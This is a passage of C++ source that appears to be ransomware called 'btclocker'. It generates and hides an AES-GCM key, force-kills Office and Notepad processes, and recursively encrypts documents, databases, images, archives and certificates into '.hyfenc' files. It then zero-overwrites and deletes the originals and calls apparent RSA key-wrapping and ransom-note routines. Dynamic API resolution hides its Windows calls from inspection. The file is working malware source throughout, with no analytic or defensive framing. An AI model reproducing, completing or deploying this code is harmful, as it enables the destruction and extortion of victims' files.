        bool isFileDatabaseType(const fs::path& filePath) {
            static const std::unordered_set<std::string> databaseExtensions = {
                ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
                ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
                ".backup", ".wal", ".journal", ".dat", ".bin"
            };

            std::string ext = filePath.extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            return databaseExtensions.find(ext) != databaseExtensions.end();
        }

        int calculatePriority(size_t fileSize, bool isDatabaseFile, int userPriority) {
            int priority = userPriority;

            if (isDatabaseFile) {
                priority += 1000;
            }

            if (fileSize < 1024 * 1024) {
                priority += 500;
            }
            else if (fileSize < 10 * 1024 * 1024) {
                priority += 200;
            }

            return priority;
        }

        std::optional<std::vector<BYTE>> readFileData(const fs::path& filePath, size_t fileSize) {
            try {
                if (auto preloaded = ioScheduler.getPreloadedData(filePath)) {
                    return preloaded;
                }

                HANDLE hFile = SAFE_CALL_API(pCreateFileW,
                    filePath.c_str(),
                    GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
                    NULL
                );

                if (hFile == INVALID_HANDLE_VALUE) {
                    DWORD error = GetLastError();
                    std::cerr << "Cannot open file for reading: " << filePath << " (Error: " << error << ")" << std::endl;
                    return std::nullopt;
                }

                struct FileHandleGuard {
                    HANDLE handle;
                    ~FileHandleGuard() { if (handle != INVALID_HANDLE_VALUE) SAFE_CALL_API(pCloseHandle, handle); }
                } guard{ hFile };

                std::vector<BYTE> data(fileSize);
                DWORD bytesRead = 0;

                if (!SAFE_CALL_API(pReadFile, hFile, data.data(), static_cast<DWORD>(fileSize), &bytesRead, NULL) ||
                    bytesRead != fileSize) {
                    std::cerr << "File read incomplete: " << filePath << " (Expected: " << fileSize << ", Actual: " << bytesRead << ")" << std::endl;
                    return std::nullopt;
                }

                return data;
            }
            catch (const std::exception& e) {
                std::cerr << "Read file data failed: " << e.what() << std::endl;
                return std::nullopt;
            }
        }

        std::optional<std::vector<BYTE>> prepareDataForEncryption(const std::vector<BYTE>& data, DWORD workerId) {
            try {
                void* alignedBuffer = dataForge.allocateAligned(data.size());
                if (!alignedBuffer) {
                    throw std::runtime_error("Failed to allocate aligned memory");
                }

                struct MemoryGuard {
                    DataForge& forge;
                    void* ptr;
                    ~MemoryGuard() { if (ptr) forge.deallocateAligned(ptr); }
                } guard{ dataForge, alignedBuffer };

                memcpy(alignedBuffer, data.data(), data.size());

                // 可选的数据混淆
                if (workerId % 4 == 0) {
                    BYTE dummyKey[KEY_LENGTH] = { 0 };
                    dataForge.obfuscateData(static_cast<BYTE*>(alignedBuffer), data.size(), dummyKey, 0);
                }

                std::vector<BYTE> result(data.size());
                memcpy(result.data(), alignedBuffer, data.size());
                return result;
            }
            catch (const std::exception& e) {
                std::cerr << "Data preparation failed: " << e.what() << std::endl;
                return std::nullopt;
            }
        }

        // 修复的GCM加密执行函数
        std::optional<std::vector<BYTE>> performGCMEncryption(const std::vector<BYTE>& data, size_t originalSize, DWORD workerId) {
            try {
                // 使用修复后的加密引擎
                GCM_ENCRYPT_RESULT result = encryptEngine.encryptGCM(data.data(), data.size());

                if (!result.success) {
                    std::cerr << "Thread-safe GCM encryption failed for data size: " << data.size()
                        << ", workerId: " << workerId << std::endl;
                    return std::nullopt;
                }

                // 构建完整加密数据：IV + 密文 + TAG
                std::vector<BYTE> encryptedData(IV_LENGTH + data.size() + TAG_LENGTH);

                // 写入IV（从线程局部上下文获取）
                auto& ctx = encryptEngine.getThreadContext();
                memcpy(encryptedData.data(), ctx.localIV, IV_LENGTH);

                // 写入密文
                memcpy(encryptedData.data() + IV_LENGTH, result.ciphertext.data(), data.size());

                // 写入认证标签
                memcpy(encryptedData.data() + IV_LENGTH + data.size(), result.tag, TAG_LENGTH);

                std::cout << "Thread-safe GCM encryption successful: " << data.size()
                    << " bytes encrypted (Worker: " << workerId << ")" << std::endl;
                return encryptedData;
            }
            catch (const std::exception& e) {
                std::cerr << "Thread-safe GCM encryption failed: " << e.what() << std::endl;
                return std::nullopt;
            }
        }

        bool commitEncryptedData(const fs::path& outputFile, const std::vector<BYTE>& encryptedData) {
            try {
                fs::path tempFile = outputFile;
                tempFile += ".tmp";

                // 创建临时文件
                HANDLE hTempFile = SAFE_CALL_API(pCreateFileW,
                    tempFile.c_str(),
                    GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL,
                    CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
                    NULL
                );

                if (hTempFile == INVALID_HANDLE_VALUE) {
                    throw std::runtime_error("Cannot create temporary file");
                }

                struct FileHandleGuard {
                    HANDLE handle;
                    FileHandleGuard(HANDLE h) : handle(h) {}
                    ~FileHandleGuard() { if (handle != INVALID_HANDLE_VALUE) SAFE_CALL_API(pCloseHandle, handle); }
                    void release() { handle = INVALID_HANDLE_VALUE; }
                } guard{ hTempFile };

                DWORD bytesWritten = 0;
                if (!SAFE_CALL_API(pWriteFile, hTempFile, encryptedData.data(), static_cast<DWORD>(encryptedData.size()), &bytesWritten, NULL) ||
                    bytesWritten != encryptedData.size()) {
                    throw std::runtime_error("Write to temporary file failed");
                }

                SAFE_CALL_API(pFlushFileBuffers, hTempFile);

                // 关键：在替换前立即关闭临时文件句柄
                SAFE_CALL_API(pCloseHandle, hTempFile);
                guard.release();

                // 原子替换
                if (!commitSanitizer.atomicFileReplace(tempFile, outputFile)) {
                    std::error_code ec;
                    fs::remove(tempFile, ec);
                    throw std::runtime_error("Atomic file replace failed");
                }

                return true;
            }
            catch (const std::exception& e) {
                std::cerr << "Commit encrypted data failed: " << e.what() << std::endl;
                fs::path tempFile = outputFile;
                tempFile += ".tmp";
                std::error_code ec;
                fs::remove(tempFile, ec);
                return false;
            }
        }

        void printProgress() {
            double progressPercent = (totalFilesProcessed > 0) ?
                (static_cast<double>(totalBytesProcessed) / (totalFilesProcessed * 1024.0 * 1024.0)) * 100.0 : 0.0;

            std::cout << "\rThread-safe GCM Pipeline Progress: " << totalFilesProcessed
                << " files, " << (totalBytesProcessed / (1024 * 1024))
                << " MB, " << std::fixed << std::setprecision(1) << progressPercent << "% completed" << std::flush;
        }
    };
}; // UltimateEncryptionPipeline 类定义结束

// 全局流水线实例声明
extern std::unique_ptr<UltimateEncryptionPipeline::PipelineController> g_PipelineController;

// ==================== 辅助函数实现 ====================
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    if (!key || length == 0) return;

    NTSTATUS status = SAFE_CALL_API(pBCryptGenRandom, nullptr, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    if (!NT_SUCCESS(status)) {
        std::random_device rd;
        std::uniform_int_distribution<int> dist(0, 255);
        for (DWORD i = 0; i < length; ++i) {
            key[i] = static_cast<BYTE>(dist(rd));
        }
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    try {
        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);

        if (FAILED(hr) || !docsPath) {
            std::cerr << "Cannot get documents path: " << hr << std::endl;
            return false;
        }

        fs::path keyPath = fs::path(docsPath) / fileName;
        fs::create_directories(keyPath.parent_path());

        std::ofstream keyFile(keyPath, std::ios::binary);
        if (!keyFile) {
            std::cerr << "Cannot create key file: " << keyPath << std::endl;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
            return false;
        }

        keyFile.write(reinterpret_cast<const char*>(key), length);
        keyFile.close();

        if (!keyFile.good()) {
            std::cerr << "Write to key file failed" << std::endl;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
            return false;
        }

        DWORD attrs = SAFE_CALL_API(pGetFileAttributesW, keyPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            SAFE_CALL_API(pSetFileAttributesW, keyPath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
        }

        std::cout << "GCM encryption key saved to: " << keyPath << std::endl;
        SAFE_CALL_API(pCoTaskMemFree, docsPath);
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "SaveKeyToDocuments error: " << e.what() << std::endl;
        return false;
    }
}

inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &path);

    if (SUCCEEDED(hr) && path != nullptr) {
        fs::path result(path);
        SAFE_CALL_API(pCoTaskMemFree, path);
        return result;
    }

    std::cerr << "Warning: Cannot get documents folder, using current directory" << std::endl;
    return fs::current_path();
}

inline bool IsAesNiSupported() {
    int cpuInfo[4] = { 0 };

    __try {
        __cpuid(cpuInfo, 0);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }

    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] & (1 << 25)) != 0;
}

inline bool isFileLocked(const fs::path& filePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;

    try {
        hFile = SAFE_CALL_API(pCreateFileW,
            filePath.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            return (error == ERROR_SHARING_VIOLATION ||
                error == ERROR_LOCK_VIOLATION ||
                error == ERROR_ACCESS_DENIED);
        }

        SAFE_CALL_API(pCloseHandle, hFile);
        return false;
    }
    catch (...) {
        if (hFile != INVALID_HANDLE_VALUE) {
            SAFE_CALL_API(pCloseHandle, hFile);
        }
        return true;
    }
}

// ==================== 安全删除相关函数 ====================
inline bool SecureDeleteFilehf(const fs::path& filePath, int maxRetries) {
    for (int attempt = 0; attempt < maxRetries; ++attempt) {
        HANDLE hFile = INVALID_HANDLE_VALUE;

        try {
            std::cout << "SecureDeleteFilehf attempt " << (attempt + 1) << " for: " << filePath << std::endl;

            // 检查加密副本是否存在
            fs::path encryptedFile = filePath;
            encryptedFile += ".hyfenc";

            if (!fs::exists(encryptedFile)) {
                std::cerr << "Encrypted file not found, skipping deletion: " << filePath << std::endl;
                return false;
            }

            // 验证加密文件的有效性
            if (!validateEncryptedFile(encryptedFile, filePath)) {
                std::cerr << "Encrypted file validation failed, skipping deletion: " << filePath << std::endl;
                return false;
            }

            if (!fs::exists(filePath)) {
                std::cout << "File not found, deletion successful: " << filePath << std::endl;
                return true;
            }

            std::error_code ec;
            if (fs::remove(filePath, ec)) {
                std::cout << "Simple deletion successful: " << filePath << std::endl;
                return true;
            }

            hFile = SAFE_CALL_API(pCreateFileW,
                filePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                DWORD error = GetLastError();
                std::cerr << "Cannot open file for secure deletion (error " << error << "): " << filePath << std::endl;

                if (attempt == maxRetries - 1) {
                    std::error_code ec2;
                    return fs::remove(filePath, ec2);
                }
                continue;
            }

            LARGE_INTEGER fileSize;
            if (!SAFE_CALL_API(pGetFileSizeEx, hFile, &fileSize)) {
                SAFE_CALL_API(pCloseHandle, hFile);
                std::cerr << "Cannot get file size: " << filePath << std::endl;
                continue;
            }

            if (fileSize.QuadPart == 0) {
                SAFE_CALL_API(pCloseHandle, hFile);
                std::error_code ec3;
                bool result = fs::remove(filePath, ec3);
                std::cout << "Empty file deleted: " << filePath << " - " << (result ? "success" : "failed") << std::endl;
                return result;
            }

            std::vector<BYTE> zeroBuffer(64 * 1024, 0);
            LARGE_INTEGER offset = { 0 };
            LONGLONG remaining = fileSize.QuadPart;

            while (remaining > 0) {
                DWORD toWrite = static_cast<DWORD>(std::min(static_cast<LONGLONG>(zeroBuffer.size()), remaining));
                DWORD written = 0;

                if (!SAFE_CALL_API(pSetFilePointerEx, hFile, offset, NULL, FILE_BEGIN) ||
                    !SAFE_CALL_API(pWriteFile, hFile, zeroBuffer.data(), toWrite, &written, NULL)) {
                    DWORD error = GetLastError();
                    std::cerr << "Write failed at offset " << offset.QuadPart << " (error " << error << ")" << std::endl;
                    SAFE_CALL_API(pCloseHandle, hFile);
                    throw std::runtime_error("Write failed during secure deletion");
                }

                offset.QuadPart += toWrite;
                remaining -= toWrite;
            }

            SAFE_CALL_API(pFlushFileBuffers, hFile);
            SAFE_CALL_API(pCloseHandle, hFile);

            std::error_code ec4;
            bool finalResult = fs::remove(filePath, ec4);
            std::cout << "Secure deletion completed: " << filePath << " - " << (finalResult ? "success" : "failed") << std::endl;
            return finalResult;

        }
        catch (const std::exception& e) {
            if (hFile != INVALID_HANDLE_VALUE) {
                SAFE_CALL_API(pCloseHandle, hFile);
            }
            std::cerr << "SecureDeleteFilehf exception (attempt " << (attempt + 1) << "): " << e.what() << std::endl;

            if (attempt == maxRetries - 1) {
                std::error_code ec;
                return fs::remove(filePath, ec);
            }
            Sleep(1000);
        }
    }
    return false;
}

inline bool validateEncryptedFile(const fs::path& encryptedFile, const fs::path& originalFile) {
    try {
        if (!fs::exists(encryptedFile)) {
            std::cerr << "Encrypted file not found: " << encryptedFile << std::endl;
            return false;
        }

        uintmax_t encryptedSize = fs::file_size(encryptedFile);
        uintmax_t originalSize = fs::file_size(originalFile);

        uintmax_t minExpectedSize = originalSize + IV_LENGTH + TAG_LENGTH;

        if (encryptedSize < minExpectedSize) {
            std::cerr << "Encrypted file too small: " << encryptedFile
                << " (expected: " << minExpectedSize << ", actual: " << encryptedSize << ")" << std::endl;
            return false;
        }

        if (!validateFileHeader(encryptedFile)) {
            std::cerr << "Invalid file header: " << encryptedFile << std::endl;
            return false;
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "Encrypted file validation error: " << e.what() << std::endl;
        return false;
    }
}

inline bool validateFileHeader(const fs::path& encryptedFile) {
    try {
        std::ifstream file(encryptedFile, std::ios::binary);
        if (!file) return false;

        BYTE iv[IV_LENGTH];
        if (!file.read(reinterpret_cast<char*>(iv), IV_LENGTH)) {
            return false;
        }

        for (DWORD i = 0; i < IV_LENGTH; ++i) {
            if (iv[i] != 0) {
                return true;
            }
        }

        return false;
    }
    catch (...) {
        return false;
    }
}

inline bool validateEncryptedFileStable(const fs::path& encryptedFile) {
    try {
        if (!fs::exists(encryptedFile)) {
            return false;
        }

        // 检查文件大小稳定性
        auto size1 = fs::file_size(encryptedFile);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        auto size2 = fs::file_size(encryptedFile);

        return size1 == size2 && validateFileHeader(encryptedFile);
    }
    catch (...) {
        return false;
    }
}

inline bool SecureDelete(const fs::path& path) {
    try {
        if (!fs::exists(path)) {
            return true;
        }

        if (fs::is_directory(path)) {
            for (const auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    fs::path encryptedFile = entry.path();
                    encryptedFile += ".hyfenc";

                    if (fs::exists(encryptedFile)) {
                        if (!validateEncryptedFile(encryptedFile, entry.path())) {
                            std::cerr << "Skipping deletion due to validation failure: " << entry.path() << std::endl;
                            continue;
                        }
                    }

                    if (!SecureDeleteFilehf(entry.path(), 3)) {
                        return false;
                    }
                }
            }
            return fs::remove_all(path) > 0;
        }

        fs::path encryptedFile = path;
        encryptedFile += ".hyfenc";

        if (fs::exists(encryptedFile)) {
            if (!validateEncryptedFile(encryptedFile, path)) {
                std::cerr << "Skipping deletion due to validation failure: " << path << std::endl;
                return false;
            }
        }

        return SecureDeleteFilehf(path, 3);
    }
    catch (const std::exception& e) {
        std::cerr << "SecureDelete error for " << path << ": " << e.what() << std::endl;
        return false;
    }
}

inline void SetConsoleChineseSupport() {
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);

    CONSOLE_FONT_INFOEX fontInfo;
    fontInfo.cbSize = sizeof(fontInfo);
    fontInfo.nFont = 0;
    fontInfo.dwFontSize.X = 0;
    fontInfo.dwFontSize.Y = 16;
    fontInfo.FontFamily = FF_DONTCARE;
    fontInfo.FontWeight = FW_NORMAL;
    wcscpy_s(fontInfo.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), FALSE, &fontInfo);
}

inline bool LoadKeyFromDocuments(BYTE* key, DWORD length, const std::wstring& fileName) {
    try {
        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);

        if (SUCCEEDED(hr) && docsPath != nullptr) {
            fs::path keyPath = fs::path(docsPath) / fileName;
            SAFE_CALL_API(pCoTaskMemFree, docsPath);

            if (fs::exists(keyPath)) {
                std::ifstream keyFile(keyPath, std::ios::binary);
                if (keyFile) {
                    keyFile.read(reinterpret_cast<char*>(key), length);
                    if (keyFile.gcount() == length) {
                        std::cout << "Key loaded from documents: " << keyPath << std::endl;
                        return true;
                    }
                }
            }
        }

        fs::path currentKeyPath = fs::current_path() / fileName;
        if (fs::exists(currentKeyPath)) {
            std::ifstream keyFile(currentKeyPath, std::ios::binary);
            if (keyFile) {
                keyFile.read(reinterpret_cast<char*>(key), length);
                if (keyFile.gcount() == length) {
                    std::cout << "Key loaded from current directory: " << currentKeyPath << std::endl;
                    return true;
                }
            }
        }

        std::cerr << "Key file not found in documents or current directory" << std::endl;
        return false;

    }
    catch (const std::exception& e) {
        std::cerr << "LoadKeyFromDocuments error: " << e.what() << std::endl;
        return false;
    }
}

inline int encrypthf() {
    try {
        SetConsoleChineseSupport();

        if (!g_DynamicAPIInitializer.IsInitialized()) {
            std::cerr << "Failed to initialize dynamic APIs" << std::endl;
            return 1;
        }

        std::cout << "=== Thread-Safe Ultimate Encryption Pipeline Started (GCM Mode) ===" << std::endl;

        bool hwAccelSupported = IsAesNiSupported();
        std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;

        if (!hwAccelSupported) {
            std::cout << "Warning: Hardware acceleration (AES-NI) not detected. "
                << "Encryption will be performed in software mode, which may be slower." << std::endl;
        }

        BYTE encryptionKey[KEY_LENGTH];
        GenerateRandomKey(encryptionKey, KEY_LENGTH);

        std::cout << "Saving encryption key to documents directory..." << std::endl;

        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);
        bool keySaved = false;

        if (SUCCEEDED(hr) && docsPath != nullptr) {
            fs::path keyPath = fs::path(docsPath) / L"btclocker_key.bin";
            std::cout << "Key path: " << keyPath << std::endl;

            fs::create_directories(keyPath.parent_path());

            std::ofstream keyFile(keyPath, std::ios::binary);
            if (keyFile) {
                keyFile.write(reinterpret_cast<const char*>(encryptionKey), KEY_LENGTH);
                keyFile.close();

                if (fs::exists(keyPath)) {
                    DWORD attrs = SAFE_CALL_API(pGetFileAttributesW, keyPath.c_str());
                    if (attrs != INVALID_FILE_ATTRIBUTES) {
                        SAFE_CALL_API(pSetFileAttributesW, keyPath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
                    }
                    std::cout << "Key saved to documents directory: " << keyPath << std::endl;
                    keySaved = true;
                }
            }
            SAFE_CALL_API(pCoTaskMemFree, docsPath);
        }

        if (!keySaved) {
            std::cerr << "Failed to save key to documents directory, trying current directory..." << std::endl;

            fs::path currentKeyPath = fs::current_path() / "btclocker_key.bin";
            std::ofstream altKeyFile(currentKeyPath, std::ios::binary);
            if (altKeyFile) {
                altKeyFile.write(reinterpret_cast<const char*>(encryptionKey), KEY_LENGTH);
                altKeyFile.close();
                if (fs::exists(currentKeyPath)) {
                    std::cout << "Key saved to current directory: " << currentKeyPath << std::endl;
                    keySaved = true;
                }
            }
        }

        if (!keySaved) {
            std::cerr << "Critical: All key save attempts failed!" << std::endl;
            std::cerr << "Key will only be available in memory during this session." << std::endl;

            std::cout << "Key (hex): ";
            for (DWORD i = 0; i < KEY_LENGTH; ++i) {
                printf("%02X", encryptionKey[i]);
            }
            std::cout << std::endl;
        }

        std::this_thread::sleep_for(std::chrono::seconds(2));

        BYTE verifyKey[KEY_LENGTH];
        bool keyVerified = false;

        PWSTR verifyDocsPath = nullptr;
        HRESULT verifyHr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &verifyDocsPath);

        if (SUCCEEDED(verifyHr) && verifyDocsPath != nullptr) {
            fs::path verifyKeyPath = fs::path(verifyDocsPath) / L"btclocker_key.bin";
            std::cout << "Verifying key at: " << verifyKeyPath << std::endl;

            if (fs::exists(verifyKeyPath)) {
                std::ifstream verifyKeyFile(verifyKeyPath, std::ios::binary);
                if (verifyKeyFile) {
                    verifyKeyFile.read(reinterpret_cast<char*>(verifyKey), KEY_LENGTH);
                    if (verifyKeyFile.gcount() == KEY_LENGTH) {
                        keyVerified = true;
                        std::cout << "Key verified in documents directory" << std::endl;
                    }
                }
            }
            SAFE_CALL_API(pCoTaskMemFree, verifyDocsPath);
        }

        if (!keyVerified) {
            fs::path currentVerifyPath = fs::current_path() / "btclocker_key.bin";
            if (fs::exists(currentVerifyPath)) {
                std::ifstream verifyKeyFile(currentVerifyPath, std::ios::binary);
                if (verifyKeyFile) {
                    verifyKeyFile.read(reinterpret_cast<char*>(verifyKey), KEY_LENGTH);
                    if (verifyKeyFile.gcount() == KEY_LENGTH) {
                        keyVerified = true;
                        std::cout << "Key verified in current directory" << std::endl;
                    }
                }
            }
        }

        if (!keyVerified) {
            std::cerr << "Warning: Could not verify key file existence" << std::endl;
        }
        else {
            if (memcmp(encryptionKey, verifyKey, KEY_LENGTH) != 0) {
                std::cerr << "Warning: Key verification failed - file content mismatch" << std::endl;
            }
            else {
                std::cout << "Key file verified successfully" << std::endl;
            }
        }

        std::cout << "Closing potential file-locking applications..." << std::endl;
        system("taskkill /f /im winword.exe > nul 2>&1");
        system("taskkill /f /im excel.exe > nul 2>&1");
        system("taskkill /f /im powerpnt.exe > nul 2>&1");
        system("taskkill /f /im notepad.exe > nul 2>&1");
        Sleep(2000);

        std::vector<std::string> extensions = {
            ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
            ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
            ".qbb", ".qbo", ".ofx",
            ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
            ".psd", ".ai", ".dwg", ".skp",
            ".vmdk", ".iso", ".pfx", ".pems",
            ".pst", ".mbox", ".mpp",
            ".jar", ".zip", ".tar.gz",
            ".ppt", ".jpg", ".png", ".txtx", ".jpeg"
        };

        fs::path targetDirectory = fs::current_path();
        std::cout << "Target directory: " << targetDirectory << std::endl;
        std::cout << "Target extensions: " << extensions.size() << " types" << std::endl;

        std::cout << "\nEncryption Strategy (Thread-Safe GCM Mode):" << std::endl;
        std::cout << "- Database files: Full encryption" << std::endl;
        std::cout << "- Small files (<1MB): Header encryption (4KB)" << std::endl;
        std::cout << "- Large files (>=1MB): Partial encryption (15% per chunk)" << std::endl;
        std::cout << "- System files: Skipped" << std::endl;
        std::cout << "- Locked files: Skipped" << std::endl;

        std::cout << "\nStarting thread-safe GCM encryption process..." << std::endl;
        std::cout << "==========================================" << std::endl;

        // 创建全局流水线控制器实例
        g_PipelineController = std::make_unique<UltimateEncryptionPipeline::PipelineController>();
        if (!g_PipelineController->initializePipeline(encryptionKey)) {
            std::cerr << "Failed to initialize thread-safe encryption pipeline" << std::endl;
            return 1;
        }

        size_t totalFiles = 0;
        size_t dbFileCount = 0;
        size_t otherFileCount = 0;
        size_t skippedFiles = 0;

        static const std::vector<std::wstring> systemPatterns = {
            L"WindowsApps", L"Windows", L"System32", L"$Recycle.Bin",
            L"ProgramData\\Microsoft\\Windows", L"AppData", L"Temp",
            L"Temporary Internet Files", L"WinSxS", L"DriverStore",
            L"Assembly", L"Microsoft.NET", L"ServiceProfiles",
            L"System Volume Information"
        };

        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        std::cout << "Starting directory scan: " << targetDirectory << std::endl;

        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                targetDirectory, fs::directory_options::skip_permission_denied)) {

                if (!entry.is_regular_file()) continue;

                if (entry.path().filename() == "btclocker_key.bin" ||
                    entry.path().filename() == L"btclocker_key.bin") {
                    continue;
                }

                std::wstring filePath = entry.path().wstring();
                bool isSystemFile = false;
                for (const auto& pattern : systemPatterns) {
                    if (filePath.find(pattern) != std::wstring::npos) {
                        isSystemFile = true;
                        skippedFiles++;
                        break;
                    }
                }

                if (isSystemFile) {
                    continue;
                }

                if (isFileLocked(entry.path())) {
                    std::cout << "File is locked by another process, skipping: " << entry.path() << std::endl;
                    skippedFiles++;
                    continue;
                }

                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
                    [&](const std::string& targetExt) {
                        std::string lowerTarget = targetExt;
                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
                        return ext == lowerTarget;
                    });

                if (shouldEncrypt) {
                    fs::path outputFile = entry.path();
                    outputFile += ".hyfenc";

                    if (fs::exists(outputFile)) {
                        std::cout << "Output file already exists, skipping: " << outputFile << std::endl;
                        continue;
                    }

                    bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
                    int priority = isDatabaseFile ? 1000 : 0;

                    g_PipelineController->addEncryptionTask(entry.path(), outputFile, priority);

                    if (isDatabaseFile) {
                        dbFileCount++;
                    }
                    else {
                        otherFileCount++;
                    }
                    totalFiles++;

                    if (totalFiles % 100 == 0) {
                        std::cout << "Added " << totalFiles << " files to encryption queue..." << std::endl;
                    }
                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "Directory scan error: " << e.what() << std::endl;
        }

        std::cout << "Scan completed. Found " << totalFiles << " files to encrypt." << std::endl;
        std::cout << "  Database files: " << dbFileCount << std::endl;
        std::cout << "  Other files: " << otherFileCount << std::endl;
        std::cout << "  Skipped files: " << skippedFiles << std::endl;

        if (totalFiles == 0) {
            std::cout << "No files to encrypt." << std::endl;

            rsaencrypt();
            showtext();

            g_PipelineController->shutdownPipeline();
            return 0;
        }

        std::cout << "\nWaiting for encryption to complete..." << std::endl;
        g_PipelineController->waitForCompletion();

        std::cout << "\n=== Thread-Safe Encryption Complete ===" << std::endl;
        std::cout << "Total files processed: " << totalFiles << std::endl;
        std::cout << "Database files: " << dbFileCount << std::endl;
        std::cout << "Other files: " << otherFileCount << std::endl;
        std::cout << "Files skipped: " << skippedFiles << std::endl;

        g_PipelineController->shutdownPipeline();

        rsaencrypt();
        showtext();

        std::cout << "==========================================" << std::endl;
        std::cout << "Thread-safe file encryption tool finished successfully." << std::endl;

        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;

        if (g_PipelineController) {
            g_PipelineController->shutdownPipeline();
        }
        return 1;
    }
}

// 全局流水线实例定义
std::unique_ptr<UltimateEncryptionPipeline::PipelineController> g_PipelineController = nullptr;

#endif // TEX_H